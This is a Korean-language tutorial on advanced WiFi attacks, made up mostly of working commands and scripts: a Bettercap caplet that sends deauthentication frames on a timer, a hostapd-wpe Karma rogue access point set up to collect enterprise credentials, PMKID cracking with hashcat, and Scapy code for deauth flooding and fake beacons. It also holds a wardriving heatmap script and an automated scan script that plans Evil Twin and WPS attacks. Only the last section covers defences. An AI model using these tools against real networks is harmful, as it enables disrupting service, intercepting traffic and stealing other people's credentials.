# 고급 WiFi 공격 기법

## 1. Bettercap - MITM 자동화

```bash
# Bettercap 설치
sudo apt install bettercap

# Bettercap 실행 (무선)
sudo bettercap -iface wlan0mon

# 대화형 모드 명령어
wifi.recon on                          # WiFi 정찰 시작
wifi.show                              # AP 목록 표시
wifi.assoc AA:BB:CC:DD:EE:FF          # 특정 AP 타겟
wifi.deauth AA:BB:CC:DD:EE:FF         # Deauth 전송

# Caplet(자동화 스크립트) 실행
sudo bettercap -iface wlan0mon -caplet wifi_attack.cap
```

```
# wifi_attack.cap
set wifi.interface wlan0mon
set wifi.handshakes.file /tmp/handshakes.pcap

wifi.recon on
events.ignore wifi.client.probe

set $ {green}{env.iface.name}{reset} > {bold}{net.proto}{reset} {bold}{net.dst}{reset}

# 5분마다 Deauth 전송
set ticker.commands "wifi.deauth"
set ticker.period 300
ticker on
```

---

## 2. Airgeddon - 올인원 WiFi 공격 프레임워크

```bash
# 설치
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh

# 메뉴 구조:
# 1. 인터페이스 선택
# 2. 모니터 모드 전환
# 3. WPA 공격
#    3a. 핸드셰이크 캡처
#    3b. Offline cracking
#    3c. Evil Twin 공격
# 4. WPS 공격
# 5. WEP 공격
# 6. 기업 네트워크 공격
# 7. DoS 공격
```

---

## 3. Karma 공격 (자동 AP 연결)

### Probe Request 기반 공격

```
원리:
클라이언트는 연결했던 AP를 기억하고
Probe Request 브로드캐스트 전송

Karma:
모든 Probe Request에 응답
→ 클라이언트가 자동으로 연결
→ MITM 위치 확보
```

```bash
# Hostapd-WPE (Karma 모드)
cat > /etc/hostapd-wpe/karma.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=FreeWiFi
channel=6
hw_mode=g

# Karma 설정
karma=1                    # Karma 모드 활성화
karma_black_ssids_file=/etc/hostapd-wpe/karma.black  # 블랙리스트

# 기업 인증 (WPA Enterprise)
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.pem
EOF

sudo hostapd-wpe karma.conf
```

---

## 4. PMKID + GPU 클러스터 크래킹

```bash
# 여러 GPU를 가진 시스템 설정
# hashcat 자동으로 모든 GPU 활용
hashcat -m 22000 pmkid.hc22000 rockyou.txt

# 특정 GPU 선택
hashcat -m 22000 pmkid.hc22000 rockyou.txt -d 1,2,3  # GPU 1,2,3 사용

# 원격 크래킹 서버 설정 (Hashtopolis)
docker run --gpus all \
    -p 7070:7070 \
    -v /data:/data \
    hashtopolis/hashtopolis-server

# 에이전트 설정
python3 hashtopolis.zip \
    --server http://CRACK_SERVER:7070 \
    --token API_TOKEN
```

---

## 5. 드라이브바이 무선 스캔 (Wardriving)

```bash
# Kismet + GPS로 지도 작성
sudo apt install kismet gpsd

# GPS 데몬 시작
sudo gpsd /dev/ttyUSB0 -F /var/run/gpsd.sock

# Kismet + GPS 연동
cat >> /etc/kismet/kismet.conf << 'EOF'
source=wlan0mon:name=wifi
gps=gpsd:host=localhost,port=2947
EOF

sudo kismet

# WiGLE 업로드 형식 변환
kismetdb_to_wiglecsv --in wardriving.kismet --out wardriving.csv

# Python으로 GPS 기반 히트맵 생성
pip install folium pandas
```

```python
#!/usr/bin/env python3
"""Kismet CSV → 히트맵 생성"""
import folium
import pandas as pd
from folium.plugins import HeatMap

# Kismet CSV 파싱
df = pd.read_csv('wardriving.csv', skiprows=1, names=[
    'WigleWifi-1.4', 'appRelease', 'model', 'release',
    'device', 'display', 'board', 'brand', 'star',
    'MAC', 'SSID', 'AuthMode', 'FirstSeen', 'Channel',
    'RSSI', 'CurrentLatitude', 'CurrentLongitude',
    'AltitudeMeters', 'AccuracyMeters', 'Type'
])

# 유효한 GPS 좌표만 선택
df = df.dropna(subset=['CurrentLatitude', 'CurrentLongitude'])
df = df[df['CurrentLatitude'] != 0.0]

# WPA2 네트워크만 필터
wpa2 = df[df['AuthMode'].str.contains('WPA2', na=False)]

# 히트맵 생성
m = folium.Map(location=[37.5665, 126.9780], zoom_start=13)  # 서울 기준

heat_data = [[row['CurrentLatitude'], row['CurrentLongitude']] 
             for _, row in wpa2.iterrows()]
HeatMap(heat_data).add_to(m)

m.save('wifi_heatmap.html')
print(f"[+] 히트맵 생성: wifi_heatmap.html ({len(wpa2)}개 AP)")
```

---

## 6. 채널 호핑 및 5GHz 공격

```bash
# 5GHz 대역 스캔
sudo airodump-ng --band a wlan0mon  # 5GHz only
sudo airodump-ng --band abg wlan0mon  # 2.4+5GHz

# 채널 호핑 커스텀
sudo airodump-ng --channel 36,40,44,48,149,153,157,161 wlan0mon

# 5GHz Deauth (주의: 일부 드라이버 미지원)
sudo aireplay-ng --deauth 10 -a BSSID -c CLIENT wlan0mon

# 5GHz 지원 어댑터 확인
iw dev wlan0 info
iw phy phy0 info | grep -A5 "Band 2"  # 5GHz 지원 여부
```

---

## 7. 무선 패킷 주입 테스트

```bash
# 주입 가능 여부 테스트
sudo aireplay-ng --test wlan0mon

# 패킷 주입 공격 유형
aireplay-ng -0 10 -a BSSID wlan0mon           # Deauthentication
aireplay-ng -1 0 -a BSSID -h HMAC wlan0mon    # Fake Authentication
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0mon  # Interactive
aireplay-ng -3 -b BSSID -h HMAC wlan0mon      # ARP Request Replay
aireplay-ng -4 -b BSSID -h HMAC wlan0mon      # KoreK Chopchop (WEP)
aireplay-ng -5 -b BSSID -h HMAC wlan0mon      # Fragmentation (WEP)
aireplay-ng -6 -b BSSID -h HMAC wlan0mon      # Cafe-Latte (WEP)
aireplay-ng -7 -b BSSID -h HMAC wlan0mon      # Hirte (WEP Client)
aireplay-ng -8 -b BSSID wlan0mon              # WPA Migration
aireplay-ng -9 wlan0mon                       # Injection Test
```

---

## 8. Scapy로 무선 패킷 분석/생성

```python
#!/usr/bin/env python3
"""Scapy로 WiFi 패킷 분석 및 조작"""

from scapy.all import *
from scapy.layers.dot11 import (Dot11, Dot11Beacon, Dot11Elt, 
                                  Dot11Deauth, Dot11Auth, RadioTap)
import time
import threading

# ===== AP 스캔 =====
def scan_aps(interface='wlan0mon', timeout=10):
    """주변 AP 스캔"""
    aps = {}
    
    def handle_packet(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            channel = int(ord(pkt[Dot11Elt:3].info))
            
            if bssid not in aps:
                aps[bssid] = {'ssid': ssid, 'channel': channel}
                print(f"[+] AP 발견: {ssid} ({bssid}) CH:{channel}")
    
    sniff(iface=interface, prn=handle_packet, timeout=timeout)
    return aps

# ===== Deauth 공격 =====
def deauth_attack(interface, bssid, client='FF:FF:FF:FF:FF:FF', count=100):
    """Deauthentication 패킷 전송"""
    
    packet = RadioTap() / Dot11(
        type=0,     # 관리 프레임
        subtype=12, # Deauth
        addr1=client,   # 수신자 (클라이언트 or 브로드캐스트)
        addr2=bssid,    # 발신자 (AP MAC 스푸핑)
        addr3=bssid     # BSSID
    ) / Dot11Deauth(reason=7)  # 이유: Class 3 frame received
    
    print(f"[*] Deauth 공격: {client} → {bssid}")
    for i in range(count):
        sendp(packet, iface=interface, verbose=False)
        if i % 10 == 0:
            print(f"\r[*] {i}/{count} 패킷 전송", end='', flush=True)
    print(f"\n[+] {count}개 Deauth 패킷 전송 완료")

# ===== 가짜 AP 비콘 생성 =====
def fake_beacon(interface, ssid='FreeWiFi', bssid=None, channel=6):
    """가짜 AP 비콘 전송"""
    
    if bssid is None:
        bssid = RandMAC()
    
    beacon_frame = RadioTap() / Dot11(
        type=0,     # 관리 프레임
        subtype=8,  # Beacon
        addr1='ff:ff:ff:ff:ff:ff',
        addr2=bssid,
        addr3=bssid
    ) / Dot11Beacon(cap='ESS+privacy') / Dot11Elt(
        ID='SSID',
        info=ssid.encode()
    ) / Dot11Elt(
        ID='Rates',
        info=b'\x82\x84\x8b\x96\x24\x30\x48\x6c'
    ) / Dot11Elt(
        ID='DSset',
        info=bytes([channel])
    )
    
    print(f"[*] 가짜 AP 브로드캐스트: SSID={ssid}, BSSID={bssid}")
    sendp(beacon_frame, iface=interface, inter=0.1, loop=1)

# ===== 핸드셰이크 탐지 =====
def detect_handshake(interface, target_bssid):
    """WPA2 핸드셰이크 탐지"""
    from scapy.layers.eap import EAPOL
    
    eapol_count = {}
    
    def handle_pkt(pkt):
        if pkt.haslayer(EAPOL):
            bssid = pkt[Dot11].addr2
            if bssid == target_bssid or pkt[Dot11].addr1 == target_bssid:
                eapol_count[bssid] = eapol_count.get(bssid, 0) + 1
                
                if eapol_count.get(target_bssid, 0) >= 2:
                    print(f"\n[+] 핸드셰이크 탐지! BSSID: {target_bssid}")
                    return True
    
    print(f"[*] 핸드셰이크 대기 중: {target_bssid}")
    sniff(iface=interface, prn=handle_pkt, stop_filter=handle_pkt)

if __name__ == "__main__":
    # AP 스캔
    aps = scan_aps('wlan0mon', timeout=15)
    print(f"\n총 {len(aps)}개 AP 발견")
```

---

## 9. 무선 보안 평가 자동화

```bash
#!/bin/bash
# wifi_pentest.sh - 무선 침투 테스트 자동화

INTERFACE=$1
OUTPUT_DIR="./wifi_scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

# 모니터 모드 활성화
echo "[1/5] 모니터 모드 활성화..."
airmon-ng check kill
airmon-ng start $INTERFACE
MON_IFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
echo "[+] 모니터 인터페이스: $MON_IFACE"

# AP 스캔 (30초)
echo "[2/5] AP 스캔 중 (30초)..."
timeout 30 airodump-ng $MON_IFACE \
    --write $OUTPUT_DIR/scan \
    --output-format csv,cap 2>/dev/null

# CSV 파싱
echo "[3/5] 결과 분석..."
awk -F',' 'NR>2 && NF>5 {
    bssid=$1; channel=$4; enc=$6; ssid=$14
    gsub(/ /, "", bssid); gsub(/ /, "", channel)
    gsub(/ /, "", enc); gsub(/^ | $/, "", ssid)
    if (bssid != "") 
        print bssid, channel, enc, ssid
}' $OUTPUT_DIR/scan-01.csv | sort -u > $OUTPUT_DIR/targets.txt

echo "발견된 AP:"
cat $OUTPUT_DIR/targets.txt

# WPS 스캔
echo "[4/5] WPS 활성화 AP 스캔..."
timeout 30 wash -i $MON_IFACE -o $OUTPUT_DIR/wps_scan.txt 2>/dev/null

# 요약 보고서
echo "[5/5] 보고서 생성..."
cat > $OUTPUT_DIR/summary.md << EOF
# WiFi 침투 테스트 결과

## 스캔 정보
- 날짜: $(date)
- 인터페이스: $INTERFACE

## 발견된 네트워크
\`\`\`
$(cat $OUTPUT_DIR/targets.txt)
\`\`\`

## WPS 활성화 AP
\`\`\`
$(cat $OUTPUT_DIR/wps_scan.txt 2>/dev/null || echo "없음")
\`\`\`

## 다음 단계
- WPA2 핸드셰이크 수집 대상 선정
- WPS 활성화 AP Pixie Dust 공격 시도
- Evil Twin 공격 계획
EOF

echo "[완료] 결과: $OUTPUT_DIR/"

# 정리
airmon-ng stop $MON_IFACE
service NetworkManager restart
```

---

## 10. 방어 전략

```
무선 네트워크 보안 강화:
  □ WPA3 Personal/Enterprise 사용
  □ 강력한 비밀번호 (20자 이상, 특수문자 포함)
  □ WPS 비활성화
  □ 숨겨진 SSID (기본적 보안만, 우회 가능)
  □ MAC 주소 필터링 (추가적 보안층)
  □ 무선 IDS (WIDS) 배포 - Deauth 탐지
  □ 802.1X Enterprise 인증 (기업 환경)
  □ RADIUS 서버 인증서 검증 활성화
  □ VLAN 세분화 (게스트/업무 분리)
  □ 주기적 무선 감사 (Kismet으로 불법 AP 탐지)

무선 IDS 설정 (Kismet):
  alert=APSPOOF,5/min,10/sec
  alert=DISCONPACKET,10/min,20/sec  # Deauth 탐지
  alert=PROBENOJOIN,5/min,10/sec
```
